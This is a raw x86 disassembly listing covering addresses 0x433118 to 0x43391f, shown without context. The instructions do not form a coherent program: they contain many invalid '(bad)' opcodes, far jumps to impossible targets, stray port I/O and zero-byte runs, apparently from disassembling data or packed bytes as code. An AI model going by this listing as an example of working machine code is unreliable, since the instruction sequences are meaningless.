  433118:	pusha  
  433119:	mov    bh,0x73
  43311b:	retf   0x9704
  43311e:	add    BYTE PTR [eax],al
  433120:	add    BYTE PTR [eax],al
  433122:	add    BYTE PTR [ebx-0x3a],dh
  433125:	jo     0x433177
  433127:	aaa    
  433128:	bound  edx,QWORD PTR [ebx]
  43312a:	and    bl,BYTE PTR [edx]
  43312c:	ss mov ecx,0xe38a3e7
  433132:	adc    DWORD PTR [ebx-0x4e13613e],edi
  433138:	dec    esp
  433139:	pop    eax
  43313a:	jb     0x43317c
  43313c:	nop
  43313d:	push   es
  43313e:	jb     0x433100
  433140:	pop    DWORD PTR [edx]
  433142:	bound  ebx,QWORD PTR [edi-0x4ea00bb5]
  433148:	push   0xbfe83599
  43314d:	xchg   edi,eax
  43314e:	mov    ecx,0xb4bb5e7c
  433153:	jno    0x433183
  433155:	in     al,0x35
  433157:	ror    bl,0xfc
  43315a:	call   0x7286e3f2
  43315f:	addr16 sub al,0xdc
  433162:	sbb    DWORD PTR [edi+edx*2-0x15],0x6224088e
  43316a:	(bad)  [eax-0x21]
  43316d:	xor    al,ch
  43316f:	sbb    al,0xf7
  433171:	xor    bl,ch
  433173:	ds sub al,0xc4
  433176:	xor    ebp,0x666eb69
  43317c:	jnp    0x433115
  43317e:	das    
  43317f:	mov    esp,0xb1569d0a
  433184:	sub    eax,0xaecf
  433189:	add    BYTE PTR [eax],al
  43318b:	add    BYTE PTR [ecx+0x6],dl
  43318e:	dec    eax
  43318f:	push   0xffffffc8
  433191:	mov    bl,0xd0
  433193:	in     eax,0x93
  433195:	std    
  433196:	xchg   edi,eax
  433197:	inc    ebp
  433198:	add    eax,DWORD PTR [edx]
  43319a:	inc    eax
  43319b:	xchg   edi,eax
  43319c:	clc    
  43319d:	xor    eax,0xccfc2151
  4331a2:	or     eax,0x410070da
  4331a7:	mov    eax,0xee6f61a
  4331ac:	daa    
  4331ad:	sti    
  4331ae:	(bad)  
  4331af:	(bad)  
  4331b0:	jmp    0xfdb8c563
  4331b5:	sub    ebp,DWORD PTR [ebx+0x4235e075]
  4331bb:	or     BYTE PTR [ecx],dl
  4331bd:	mov    bh,0xec
  4331bf:	(bad)  
  4331c0:	jmp    0xcd88cbed
  4331c5:	push   ds
  4331c6:	call   0xe900:0xca96c14d
  4331cd:	scas   al,BYTE PTR es:[edi]
  4331ce:	xchg   ebx,eax
  4331cf:	fadd   st,st(2)
  4331d1:	lods   eax,DWORD PTR ds:[esi]
  4331d2:	imul   ecx,ebx,0xe
  4331d5:	cs in  al,0xff
  4331d8:	test   DWORD PTR [ebx*8+0x7a3ba8c3],edi
  4331df:	sub    DWORD PTR [edx+edx*4+0xe],0x74
  4331e4:	mov    bh,0x2d
  4331e6:	push   0xfffffffc
  4331e8:	mov    ebx,0xe2856e3b
  4331ed:	cmp    edx,DWORD PTR [eax]
  4331ef:	xor    eax,DWORD PTR [eax]
  4331f1:	add    BYTE PTR [eax],al
  4331f3:	add    BYTE PTR [eax],al
  4331f5:	jmp    0x2249c812
  4331fa:	sub    BYTE PTR [esi-0x17d91315],bh
  433200:	inc    ax
  433202:	cmp    BYTE PTR ds:0xf46f6a75,0x11
  433209:	cmp    esi,DWORD PTR ds:0xb67804e1
  43320f:	push   cs
  433210:	jae    0x4331a0
  433212:	xchg   DWORD PTR [ebx+0x40b9e066],ebp
  433218:	mov    esi,DWORD PTR [ebx+0x36]
  43321b:	loope  0x43321f
  43321d:	pop    es
  43321e:	fs ins BYTE PTR es:[edi],dx
  433220:	jge    0x43328f
  433222:	mov    bh,0x61
  433224:	sub    dl,al
  433226:	add    esi,esp
  433228:	sbb    ecx,edx
  43322a:	shr    al,0x8b
  43322d:	nop
  43322e:	ret    
  43322f:	xchg   esp,eax
  433230:	cli    
  433231:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433232:	pop    edx
  433233:	mov    bh,0x3
  433235:	xchg   ecx,eax
  433236:	dec    ebx
  433237:	rsqrtps xmm4,XMMWORD PTR [edi+0x60]
  43323b:	loope  0x4332a4
  43323d:	mov    ds:0xd0850f0b,al
  433242:	out    0x12,al
  433244:	jg     0x433211
  433246:	pop    eax
  433247:	xchg   edi,eax
  433248:	retf   0x34f8
  43324b:	jge    0x433247
  43324d:	out    0xd4,eax
  43324f:	dec    edi
  433250:	out    0x93,al
  433252:	int3   
  433253:	pop    edx
  433254:	cli    
  433255:	aaa    
  433256:	cdq    
  433257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433258:	enter  0x0,0x0
  43325c:	add    BYTE PTR [eax],al
  43325e:	ror    BYTE PTR [edi+0xf],cl
  433261:	push   ebp
  433262:	sbb    edi,DWORD PTR [eax-0x71]
  433265:	jmp    0x4331f3
  433267:	leave  
  433268:	jge    0x4332ae
  43326a:	mov    ah,0x9b
  43326c:	mov    eax,0xa4496300
  433271:	mov    eax,0x800f4b92
  433276:	inc    edx
  433277:	call   0xfbbd:0xe2987499
  43327e:	pop    DWORD PTR [esi+0x4bd00fa7]
  433284:	xchg   esi,eax
  433285:	mov    edi,0x54988905
  43328a:	mov    BYTE PTR [ebp-0x2c2a72ed],al
  433290:	mov    ds:0xa2ffcd8c,al
  433295:	mov    ebp,cs
  433297:	out    dx,eax
  433298:	cmp    bl,BYTE PTR [eax]
  43329a:	nop
  43329b:	dec    ebx
  43329c:	movntq QWORD PTR [ebx+0x13fa5acc],mm2
  4332a3:	mov    ds:0x62887516,eax
  4332a8:	(bad)  
  4332a9:	repz mov ebp,0xa48af8b2
  4332af:	pop    edx
  4332b0:	pusha  
  4332b1:	inc    esi
  4332b2:	leave  
  4332b3:	imul   esi,DWORD PTR [edi],0x8
  4332b6:	nop
  4332b7:	or     BYTE PTR [ebp-0x36692c70],ah
  4332bd:	mov    bl,0xa
  4332bf:	out    0xd1,al
  4332c1:	test   DWORD PTR [eax],0x0
  4332c7:	push   cs
  4332c8:	arpl   sp,sp
  4332ca:	xchg   edi,eax
  4332cb:	mov    bl,0xc6
  4332cd:	js     0x43331e
  4332cf:	cli    
  4332d0:	retf   
  4332d1:	cmc    
  4332d2:	mov    cl,0xea
  4332d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4332d5:	int3   
  4332d6:	clc    
  4332d7:	inc    ebx
  4332d8:	ret    0x435
  4332db:	(bad)  [edi-0x975bc8e]
  4332e1:	push   ecx
  4332e2:	call   0xc005948e
  4332e7:	xchg   edi,eax
  4332e8:	repnz cmc 
  4332ea:	mov    dl,dl
  4332ec:	add    BYTE PTR [edx+eax*2],bl
  4332ef:	mov    esi,DWORD PTR [edx+0x2bb8b2a]
  4332f5:	sub    ebx,edx
  4332f7:	mov    esi,0x9bc87304
  4332fc:	add    DWORD PTR [ecx],ebp
  4332fe:	stos   BYTE PTR es:[edi],al
  4332ff:	xchg   ebp,eax
  433300:	add    ecx,DWORD PTR [ecx]
  433302:	mov    bl,0x48
  433304:	mov    dl,0xf5
  433306:	add    edx,DWORD PTR [eax]
  433308:	add    eax,0x5ecc8d07
  43330d:	jl     0x433307
  43330f:	mov    edx,0x731503b5
  433315:	ret    0x6ae9
  433318:	out    0xe9,al
  43331a:	push   ds
  43331b:	in     al,0xc2
  43331d:	pop    esp
  43331e:	cwde   
  43331f:	mov    eax,DWORD PTR [ebx]
  433321:	push   ebp
  433322:	cwde   
  433323:	xchg   edi,eax
  433324:	pop    edi
  433325:	mov    ds:0xec64a1f,al
  43332a:	leave  
  43332b:	add    BYTE PTR [eax],al
  43332d:	add    BYTE PTR [eax],al
  43332f:	add    BYTE PTR [ebx-0x60],al
  433332:	push   cs
  433333:	cli    
  433334:	sbb    DWORD PTR [ecx+eiz*2+0x25],0x42a4ad51
  43333c:	sbb    BYTE PTR [eax],ah
  43333e:	sbb    ebp,DWORD PTR [ebp-0x52fea3a7]
  433344:	and    esp,DWORD PTR [eax+0x852730e]
  43334a:	(bad)  
  43334b:	sub    eax,DWORD PTR [ebx]
  43334d:	pusha  
  43334e:	ds call 0x93cf:0x5c440238
  433356:	(bad)  
  433357:	cmp    cl,al
  433359:	popa   
  43335a:	inc    esp
  43335b:	fimul  WORD PTR [eax]
  43335d:	xchg   esp,eax
  43335e:	bound  ebp,QWORD PTR cs:[edx+0x1fb09801]
  433365:	pop    ebp
  433366:	pop    ds
  433367:	push   0x5d
  433369:	pop    esp
  43336a:	xchg   ebp,eax
  43336b:	xor    eax,0xdceb97b8
  433370:	pop    es
  433371:	mov    al,0x4e
  433373:	jmp    0x33a45386
  433378:	sbb    esp,esi
  43337a:	xor    bh,cl
  43337c:	push   cs
  43337d:	and    BYTE PTR [ecx-0x13],ah
  433380:	or     BYTE PTR [edx-0x9],bl
  433383:	iret   
  433384:	push   es
  433385:	clc    
  433386:	adc    ch,BYTE PTR [ebx+ebx*8-0x1d]
  43338a:	and    edx,DWORD PTR [ecx+0x76eb2b4c]
  433390:	or     DWORD PTR [edi-0x6f],ecx
  433393:	ja     0x433395
  433395:	add    BYTE PTR [eax],al
  433397:	add    BYTE PTR [eax],al
  433399:	sbb    BYTE PTR [ebx-0x50885267],cl
  43339f:	ds mov bh,0x84
  4333a2:	jecxz  0x4333d6
  4333a4:	or     DWORD PTR [edx],ebp
  4333a6:	pop    edi
  4333a7:	inc    edx
  4333a8:	dec    esi
  4333a9:	inc    ecx
  4333aa:	pop    esp
  4333ab:	add    DWORD PTR [eax],eax
  4333ad:	sub    eax,0xac002b63
  4333b2:	mul    BYTE PTR [edx+0xc]
  4333b5:	mov    dl,0x6a
  4333b7:	das    
  4333b8:	sbb    al,0xb2
  4333ba:	adc    ch,BYTE PTR [edi]
  4333bc:	adc    BYTE PTR [eax-0x5df80b7a],ah
  4333c2:	lock repz cmp BYTE PTR [ebp+0x3affe8bd],dh
  4333ca:	mov    esi,0x72e95c02
  4333cf:	jmp    0x43335b
  4333d1:	scas   al,BYTE PTR es:[edi]
  4333d2:	sbb    eax,0x1c225d45
  4333d7:	test   eax,0x5629e908
  4333dc:	sbb    BYTE PTR [edx-0x4c],ah
  4333df:	out    0x10,eax
  4333e1:	mov    ch,bl
  4333e3:	pop    eax
  4333e5:	mul    bh
  4333e7:	into   
  4333e8:	lea    ebp,[eax-0x7f745343]
  4333ee:	pop    esi
  4333ef:	call   0x93edc168
  4333f4:	add    DWORD PTR [ebx-0x45fba443],ebx
  4333fa:	jmp    0x43338b
  4333fc:	rol    BYTE PTR [eax],0x0
  4333ff:	add    BYTE PTR [eax],al
  433401:	add    BYTE PTR [esi+0x788dcee7],ah
  433407:	mov    ebp,0x29a904a9
  43340c:	push   esi
  43340d:	sbb    BYTE PTR [esi],al
  43340f:	inc    edi
  433410:	das    
  433411:	add    al,0x2
  433413:	mov    cl,0x5c
  433415:	jmp    FWORD PTR [ecx-0x1236c452]
  43341b:	icebp  
  43341c:	sbb    BYTE PTR [ebp-0xb1d2d8],dl
  433422:	mov    ebx,0x208b0eb5
  433427:	pop    edx
  433428:	call   0x16f2c4a1
  43342d:	xchg   DWORD PTR [ecx-0x63b0f5e7],edx
  433433:	pop    eax
  433434:	pop    eax
  433435:	adc    DWORD PTR [eax+0x4d],0x64
  433439:	ror    BYTE PTR ds:0x8cbd0a0b,0x4b
  433440:	xchg   esi,eax
  433441:	dec    eax
  433442:	mov    al,ah
  433444:	adc    bl,bh
  433446:	rcr    BYTE PTR [ebx-0x42],0xc8
  43344a:	adc    al,0x8c
  43344c:	sbb    dl,BYTE PTR [ebp-0x52f00af]
  433452:	shl    eax,cl
  433454:	fcom   DWORD PTR [edi]
  433456:	pop    es
  433457:	call   0x4b4e384f
  43345c:	popf   
  43345d:	cli    
  43345e:	pusha  
  43345f:	xchg   DWORD PTR [esi+0x170c14c8],edi
  433465:	xchg   ebp,eax
  433466:	add    BYTE PTR [eax],al
  433468:	add    BYTE PTR [eax],al
  43346a:	add    cl,dl
  43346c:	into   
  43346d:	sar    edx,1
  43346f:	ror    BYTE PTR [edi+0xf],cl
  433472:	xchg   DWORD PTR [ecx+0x63],ecx
  433475:	pushf  
  433476:	add    bh,cl
  433478:	mov    ebx,0xd7d92eea
  43347d:	push   edx
  43347e:	or     ah,BYTE PTR ds:0xb740950b
  433484:	or     BYTE PTR [ebx+0x176f4c86],ah
  43348a:	push   ebp
  43348b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43348d:	fwait
  43348e:	call   0x7cd99fbd
  433493:	xor    BYTE PTR [ecx+0x4bd5c312],0x63
  43349a:	mov    ds:0x5c9a4bd0,eax
  43349f:	mov    al,dl
  4334a1:	jg     0x4334ba
  4334a3:	(bad)  
  4334a5:	fstp   QWORD PTR [edi-0x7a]
  4334a8:	mov    dl,0xb5
  4334aa:	add    ecx,DWORD PTR [esi]
  4334ac:	mov    ch,0x7
  4334ae:	inc    edi
  4334af:	mov    bl,0xb1
  4334b1:	add    eax,0xc976d703
  4334b6:	xchg   BYTE PTR [esi-0x4d],al
  4334b9:	in     al,0x6f
  4334bb:	pop    es
  4334bc:	enter  0x8cc6,0xc2
  4334c0:	mov    edx,0x2f5e807e
  4334c5:	icebp  
  4334c6:	shr    BYTE PTR ds:0x9b03f55d,0x24
  4334cd:	xor    eax,0xb
  4334d2:	add    BYTE PTR [eax],al
  4334d4:	aam    0x73
  4334d6:	jne    0x43347b
  4334d8:	xor    BYTE PTR [edx],0x6d
  4334db:	ret    
  4334dc:	nop
  4334dd:	std    
  4334de:	mov    bl,0x8c
  4334e0:	je     0x43346c
  4334e2:	xor    al,0xc1
  4334e4:	scas   eax,DWORD PTR es:[edi]
  4334e5:	inc    edi
  4334e6:	loopne 0x4334ad
  4334e8:	div    DWORD PTR [ebx-0x4e]
  4334eb:	iret   
  4334ec:	xor    bl,BYTE PTR [ecx+0x37]
  4334ef:	add    al,0xd3
  4334f1:	imul   BYTE PTR ds:0xf5efe645
  4334f7:	inc    edx
  4334f8:	dec    esp
  4334f9:	sahf   
  4334fa:	mov    al,ds:0xbcb28d1e
  4334ff:	rol    BYTE PTR [edi-0x403a2f99],0x73
  433506:	cmp    al,al
  433508:	(bad)  
  433509:	pop    esi
  43350a:	aaa    
  43350b:	add    al,0xd3
  43350d:	neg    BYTE PTR ds:0xf5efabe6
  433513:	mov    ss,esp
  433515:	(bad)  
  433516:	and    BYTE PTR [esi-0x6d],al
  433519:	mov    dl,0x83
  43351b:	mov    edi,0xb1f6b6b3
  433520:	push   cs
  433521:	bound  esi,QWORD PTR [ecx+eax*1+0x290e171c]
  433528:	mov    esi,fs
  43352a:	adc    DWORD PTR [ecx+0x66eb35b5],eax
  433530:	push   ss
  433531:	jb     0x43357f
  433533:	sub    ebx,DWORD PTR [edi+0x5c]
  433536:	xchg   ebp,eax
  433537:	test   al,0x0
  433539:	add    BYTE PTR [eax],al
  43353b:	add    BYTE PTR [eax],al
  43353d:	jb     0x433575
  43353f:	mov    esi,0x62d87569
  433544:	in     al,dx
  433545:	adc    esp,DWORD PTR [esi+0x7]
  433548:	mov    ah,0x92
  43354a:	xchg   esi,eax
  43354b:	xchg   ebp,esp
  43354d:	ss xor al,0x4d
  433550:	push   es
  433551:	xlat   BYTE PTR ds:[ebx]
  433552:	xor    eax,0x6c15ce4d
  433557:	mov    cs,WORD PTR [ebx]
  433559:	cli    
  43355a:	fist   WORD PTR [ecx]
  43355c:	imul   esi,DWORD PTR [ebp-0x3c],0xdbefe461
  433563:	xchg   esi,eax
  433564:	test   al,0xf2
  433566:	sbb    al,0x3d
  433568:	dec    BYTE PTR [esi]
  43356a:	nop
  43356b:	sbb    ah,BYTE PTR [esp+edi*1-0x74]
  43356f:	jmp    0x4335e6
  433571:	iret   
  433572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433573:	(bad)
  433577:	push   ecx
  433578:	adc    BYTE PTR [ecx+0x58],bh
  43357b:	inc    ebp
  43357c:	stos   DWORD PTR es:[edi],eax
  43357d:	test   BYTE PTR [edx-0x4caa1762],dh
  433583:	push   cs
  433584:	push   0xffffffeb
  433586:	pop    eax
  433587:	(bad)  
  433588:	in     al,dx
  433589:	adc    al,0x9b
  43358b:	push   cs
  43358c:	cmp    eax,0xae1d5784
  433591:	mov    edi,0x8c2900fb
  433596:	sbb    eax,DWORD PTR [ecx+0x72]
  433599:	push   0x591f2dc
  43359e:	test   DWORD PTR [esi],0x6a
  4335a4:	add    BYTE PTR [eax],al
  4335a6:	mov    eax,0xe0031a7
  4335ab:	mov    ecx,0xca7ff68
  4335b0:	jmp    0x433601
  4335b2:	(bad)  
  4335b3:	sub    edi,edi
  4335b5:	mov    ch,al
  4335b7:	or     al,0xeb
  4335b9:	inc    BYTE PTR [edi+ebx*2-0x18]
  4335bd:	jne    0x43362c
  4335bf:	mov    edx,0x4bbe0862
  4335c4:	dec    edi
  4335c5:	adc    bh,cl
  4335c7:	scas   al,BYTE PTR es:[edi]
  4335c8:	imul   edi,eax,0xffffffce
  4335cb:	sub    ecx,DWORD PTR [edi]
  4335cd:	xor    ch,BYTE PTR [ecx-0x73]
  4335d0:	xor    bh,dh
  4335d2:	in     al,0x56
  4335d4:	jmp    0x4335d5
  4335d6:	mov    ecx,0x50695b6
  4335db:	pop    ebp
  4335dc:	ins    BYTE PTR es:[edi],dx
  4335dd:	dec    esp
  4335de:	push   ebp
  4335df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4335e0:	out    0x83,eax
  4335e2:	in     eax,dx
  4335e3:	jp     0x4335fc
  4335e5:	jmp    FWORD PTR [edx+esi*2+0x2f]
  4335e9:	or     BYTE PTR [ecx],ch
  4335eb:	pop    ds
  4335ec:	pop    ebx
  4335ed:	push   0xffffffe9
  4335ef:	sub    eax,0xb492e8d5
  4335f4:	push   cs
  4335f5:	add    BYTE PTR [ecx-0x2b74b751],ch
  4335fb:	and    ebp,DWORD PTR [ecx-0x6bf416ec]
  433601:	in     al,dx
  433602:	cwde   
  433603:	pop    ds
  433604:	call   0x31:0xe81ee145
  43360b:	add    BYTE PTR [eax],al
  43360d:	add    BYTE PTR [eax],al
  43360f:	into   
  433610:	dec    ebx
  433611:	push   edi
  433612:	adc    ch,BYTE PTR [ecx-0x4a]
  433615:	xchg   ecx,eax
  433616:	shl    BYTE PTR [edx+esi*4+0x3c],0xc0
  43361b:	rcr    BYTE PTR [esi-0x6c],cl
  43361e:	dec    ebp
  43361f:	mov    eax,ds:0x20f8522d
  433624:	mov    al,0x93
  433626:	inc    ebp
  433627:	nop
  433628:	inc    ebp
  433629:	cwde   
  43362a:	inc    eax
  43362b:	xchg   esp,eax
  43362c:	sti    
  43362d:	adc    cl,cl
  43362f:	push   edx
  433630:	dec    eax
  433631:	andnps xmm1,XMMWORD PTR [ebx]
  433634:	sub    BYTE PTR [edx-0x53317b15],dl
  43363a:	repz cli 
  43363c:	dec    edx
  43363d:	lahf   
  43363e:	gs nop
  433640:	test   DWORD PTR [edi],ecx
  433642:	sti    
  433643:	mov    eax,ds:0x81cbfcf8
  433648:	or     ecx,DWORD PTR [edi]
  43364a:	test   DWORD PTR [eax+0x7f],edx
  43364d:	jmp    0x43367c
  43364f:	push   eax
  433650:	add    eax,0x63e586e0
  433655:	call   0xdd87:0x19d33c4c
  43365c:	mov    ds:0xfb8c4598,eax
  433661:	adc    cl,cl
  433663:	push   edx
  433664:	push   eax
  433665:	psubq  mm3,QWORD PTR [edi+eiz*2-0x576f99ed]
  43366d:	fwait
  43366e:	and    esp,DWORD PTR [eax+0x239bb0]
  433674:	add    BYTE PTR [eax],al
  433676:	add    BYTE PTR [eax],al
  433678:	mov    al,ds:0x9dfabd58
  43367d:	(bad)  
  43367e:	loopne 0x4336bf
  433680:	nop
  433681:	pusha  
  433682:	sub    BYTE PTR [esi],dl
  433684:	sar    BYTE PTR [eax+0x2a],1
  433687:	mov    ebp,0x869e4b8c
  43368c:	in     al,0x9a
  43368e:	mov    eax,0x68f1cff
  433693:	dec    edi
  433694:	(bad)  
  433695:	xchg   esi,eax
  433696:	push   ss
  433697:	sti    
  433698:	inc    ebp
  433699:	arpl   WORD PTR [eax+esi*1],ax
  43369c:	mov    bh,0x76
  43369e:	iret   
  43369f:	or     eax,0x4c984b50
  4336a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4336a5:	mov    dl,0x78
  4336a7:	dec    edx
  4336a8:	call   0x706c:0x4c07b52f
  4336af:	inc    ebp
  4336b0:	pop    eax
  4336b1:	je     0x4336a0
  4336b3:	add    esp,edx
  4336b5:	add    DWORD PTR [ecx+0x25af8116],ebp
  4336bb:	adc    bl,0xb2
  4336be:	test   BYTE PTR [edx-0x4d5b20a0],0x1e
  4336c5:	fidiv  DWORD PTR [edi-0x40]
  4336c8:	pop    edi
  4336c9:	add    al,0x4d
  4336cb:	icebp  
  4336cc:	les    esi,FWORD PTR [di-0xffd]
  4336d1:	and    DWORD PTR [edi-0x40],esi
  4336d4:	inc    edi
  4336d5:	adc    esi,esi
  4336d7:	nop
  4336d8:	cwde   
  4336d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4336da:	test   BYTE PTR [eax+eax*1+0x0],0x74
  4336e2:	xchg   edx,eax
  4336e3:	jns    0x4336a5
  4336e5:	das    
  4336e6:	sub    bh,dl
  4336e8:	fist   WORD PTR [ebx]
  4336ea:	out    dx,al
  4336eb:	cmc    
  4336ec:	mov    WORD PTR [esi+ebx*1+0x77],ds
  4336f0:	rcl    BYTE PTR [edi],0x13
  4336f3:	inc    ebp
  4336f4:	adc    BYTE PTR [ebx-0x4e],0xa8
  4336f8:	push   ss
  4336f9:	pushf  
  4336fa:	dec    edx
  4336fb:	mov    ebx,0xe056fbff
  433701:	adc    ebp,esi
  433703:	cmc    
  433704:	sub    BYTE PTR [edi],0xdf
  433707:	int    0xab
  433709:	adc    ebp,ecx
  43370b:	xor    eax,0x75bedb04
  433710:	icebp  
  433711:	xchg   edi,eax
  433712:	mov    dl,0x7a
  433714:	inc    ebx
  433715:	inc    ebx
  433716:	mov    edi,0xf1f3584d
  43371b:	cmc    
  43371c:	mov    bl,0xba
  43371e:	mov    esi,0xb277f195
  433723:	push   cs
  433724:	mov    cl,bh
  433726:	xor    al,0x52
  433728:	jmp    0xeda4503d
  43372d:	rcr    DWORD PTR [eax],0xf7
  433730:	clc    
  433731:	jmp    0x706122c6
  433736:	les    eax,FWORD PTR [ebx-0x72]
  433739:	push   ebp
  43373a:	pop    ebp
  43373b:	mov    esi,0xcec0bb7e
  433740:	jbe    0x4336fd
  433742:	cld    
  433743:	dec    esp
  433744:	stos   DWORD PTR es:[edi],eax
  433745:	add    BYTE PTR [eax],al
  433747:	add    BYTE PTR [eax],al
  433749:	add    BYTE PTR [edi+0x431644b2],dl
  43374f:	pop    ebp
  433750:	in     al,0xec
  433752:	ret    
  433753:	aad    0x52
  433755:	jmp    0xdd2066e6
  43375a:	pop    esi
  43375b:	jmp    0xf4550907
  433760:	push   cs
  433761:	call   0x5853:0xdbdebea6
  433768:	mov    edi,DWORD PTR [ecx+0x11]
  43376b:	hlt    
  43376c:	push   cs
  43376d:	or     DWORD PTR [ebp+ebx*8+0x2994f505],0xf397c929
  433778:	push   cs
  433779:	pusha  
  43377a:	call   0x93e8ca12
  43377f:	sub    DWORD PTR [ecx],ebp
  433781:	cmp    eax,0x4b0ef411
  433786:	arpl   bp,dx
  433788:	push   edx
  433789:	jmp    0x14494b0
  43378e:	loope  0x433727
  433790:	push   cs
  433791:	inc    edx
  433792:	jae    0x43374b
  433794:	xchg   edx,eax
  433795:	and    eax,0x5cce2d8c
  43379a:	mov    esp,0xcc1e92cf
  43379f:	push   edi
  4337a0:	in     al,dx
  4337a1:	add    ah,bl
  4337a3:	xor    ebx,DWORD PTR [ecx]
  4337a5:	inc    eax
  4337a6:	test   eax,0xcc74abd8
  4337ab:	or     eax,edi
  4337ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4337ae:	add    BYTE PTR [eax],al
  4337b0:	add    BYTE PTR [eax],al
  4337b2:	add    BYTE PTR [ecx-0x52],bh
  4337b5:	call   FWORD PTR ds:[ebx+edx*8-0x2d56bfe7]
  4337bd:	or     eax,DWORD PTR [ebp+edi*4-0x633f6e52]
  4337c4:	mov    dl,0x3c
  4337c6:	shl    BYTE PTR [edx],0x63
  4337c9:	jno    0x4337f3
  4337cb:	test   BYTE PTR [edx+0x2f],0x14
  4337cf:	mov    ?,WORD PTR [ebp-0x5af600e3]
  4337d5:	ret    
  4337d6:	sbb    ebp,DWORD PTR [ecx+0x175fc3a5]
  4337dc:	icebp  
  4337dd:	pop    ss
  4337de:	add    BYTE PTR [edx+ebp*1],cl
  4337e1:	test   DWORD PTR [ebx+0x565c4a85],0x56ff27c2
  4337eb:	ret    0x929b
  4337ee:	imul   ch
  4337f0:	psllq  mm2,QWORD PTR [edx+ebp*2]
  4337f4:	mov    edi,0x412d3ce8
  4337f9:	outs   dx,DWORD PTR ds:[esi]
  4337fa:	push   ecx
  4337fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4337fc:	pop    ss
  4337fd:	ret    
  4337fe:	push   eax
  4337ff:	dec    eax
  433800:	sub    dl,ah
  433802:	call   0x2bf85e
  433807:	ins    DWORD PTR es:[edi],dx
  433808:	out    dx,al
  433809:	bound  eax,QWORD PTR [edi]
  43380b:	cmp    esi,ebx
  43380d:	test   BYTE PTR [eax-0x7cf14d07],0x74
  433814:	stos   DWORD PTR es:[edi],eax
  433815:	push   cs
  433816:	mov    eax,DWORD PTR [eax]
  433818:	add    BYTE PTR [eax],al
  43381a:	add    BYTE PTR [eax],al
  43381c:	mov    ah,0x1a
  43381e:	std    
  43381f:	aas    
  433820:	jmp    0x909e4b2d
  433825:	cmc    
  433826:	adc    ecx,DWORD PTR [edi+0x15]
  433829:	mov    gs,WORD PTR [edx]
  43382b:	dec    edi
  43382c:	mov    edi,0xdffb1a95
  433831:	retf   
  433832:	sub    ecx,DWORD PTR [ebx]
  433834:	adc    ebx,DWORD PTR [esi+0x761c0016]
  43383a:	sahf   
  43383b:	mov    WORD PTR [ebp+0x29],ss
  43383e:	lahf   
  43383f:	cli    
  433840:	sbb    eax,0x13d20245
  433845:	or     BYTE PTR [ebx],dl
  433847:	jg     0x43384e
  433849:	pop    esp
  43384a:	pcmpeqb mm1,QWORD PTR [ebp+0x684493b8]
  433851:	mov    esp,0xdc807401
  433856:	cmp    bh,BYTE PTR [esi+0x4c]
  433859:	js     0x4337f9
  43385b:	mov    ebp,ss
  43385d:	sti    
  43385e:	lahf   
  43385f:	push   ecx
  433860:	push   edi
  433861:	popf   
  433862:	sub    bl,BYTE PTR ss:[ebx]
  433865:	jg     0x433846
  433867:	xchg   BYTE PTR [edi-0x31],cl
  43386a:	add    cl,BYTE PTR [edx]
  43386c:	aam    0x85
  43386e:	lahf   
  43386f:	cli    
  433870:	mov    ebp,0x98740247
  433875:	pushf  
  433876:	mov    esi,0xe0bf7dfa
  43387b:	aas    
  43387c:	nop
  43387d:	(bad)  
  43387e:	dec    edi
  43387f:	jae    0x433881
  433881:	add    BYTE PTR [eax],al
  433883:	add    BYTE PTR [eax],al
  433885:	add    bh,cl
  433887:	sbb    DWORD PTR [ebx-0x5f],esi
  43388a:	mov    BYTE PTR [edx],0x73
  43388d:	xchg   ebp,eax
  43388e:	xor    DWORD PTR [edi],edx
  433890:	push   ebx
  433891:	data16 lods al,BYTE PTR ds:[esi]
  433893:	cld    
  433894:	pop    ebx
  433895:	sahf   
  433896:	or     ecx,DWORD PTR [edi]
  433898:	jg     0x43386e
  43389a:	dec    edi
  43389b:	aas    
  43389c:	add    BYTE PTR [edi+0x25],al
  43389f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4338a0:	enter  0xb2d2,0xe5
  4338a4:	add    edi,DWORD PTR ds:0x61b5d929
  4338aa:	std    
  4338ab:	jo     0x4338c2
  4338ad:	popa   
  4338ae:	sub    DWORD PTR [edi-0x38695bed],edi
  4338b4:	ret    
  4338b5:	mov    bh,0x30
  4338b7:	int    0x13
  4338b9:	and    ebp,ebp
  4338bb:	js     0x43387e
  4338bd:	stos   DWORD PTR es:[edi],eax
  4338be:	push   ebp
  4338bf:	js     0x4338e5
  4338c1:	(bad)  
  4338c2:	jae    0x433859
  4338c4:	stc    
  4338c5:	inc    edi
  4338c6:	enter  0x9df8,0x92
  4338ca:	retf   0x3f5
  4338cd:	nop
  4338ce:	xor    ah,BYTE PTR [ebx]
  4338d0:	or     esp,0x7b227d56
  4338d6:	push   ebp
  4338d7:	ins    BYTE PTR es:[edi],dx
  4338d8:	mov    BYTE PTR [edi],ch
  4338da:	faddp  st(3),st
  4338dc:	(bad)  
  4338dd:	daa    
  4338de:	add    al,BYTE PTR [esi]
  4338e0:	mov    ah,0xc2
  4338e2:	daa    
  4338e3:	mov    ds:0x4cb36f0f,al
  4338e8:	adc    eax,DWORD PTR [eax]
  4338ea:	add    BYTE PTR [eax],al
  4338ec:	add    BYTE PTR [eax],al
  4338ee:	dec    edx
  4338ef:	cs xor eax,0x8a279b98
  4338f5:	getsec 
  4338f7:	pop    ss
  4338f8:	push   ecx
  4338f9:	adc    edi,DWORD PTR [edx]
  4338fb:	and    dh,dh
  4338fd:	push   ds
  4338fe:	xchg   ebp,eax
  4338ff:	daa    
  433900:	mov    dl,0xf
  433902:	das    
  433903:	and    edi,DWORD PTR [ecx]
  433905:	adc    ebx,DWORD PTR [edx]
  433907:	mov    al,ds:0x6bb9b335
  43390c:	aaa    
  43390d:	add    BYTE PTR [eax-0x79df8f01],dl
  433913:	dec    esi
  433914:	std    
  433915:	xchg   bl,ch
  433917:	mov    DWORD PTR [eax-0x6f],edi
  43391a:	mov    ds:0x16ba83b2,eax
  43391f:	pop    ebx
